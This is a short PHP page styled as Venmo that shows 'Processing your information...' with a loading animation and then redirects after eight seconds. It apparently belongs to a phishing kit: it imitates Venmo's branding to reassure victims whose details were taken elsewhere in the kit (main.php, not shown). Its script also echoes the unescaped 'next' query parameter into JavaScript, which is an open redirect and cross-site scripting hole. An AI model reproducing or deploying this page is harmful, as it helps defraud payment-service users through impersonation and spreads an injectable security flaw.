<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Venmo</title>
</head>
<body>

<main>
    <div class="form">
        <div>
            <img src="res/img/logo.png" >
        </div>



<div class="heads">
<h4 style="color:black;">Please wait...</h4>


</div>


<div class="container">

<div class="titles_holder" style="padding:10px;">
Processing your information...
<p><img src="res/img/loading.gif" style="width:60px;"></p>
 

</div>
</div>

 

 


<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script>
</body>
</html>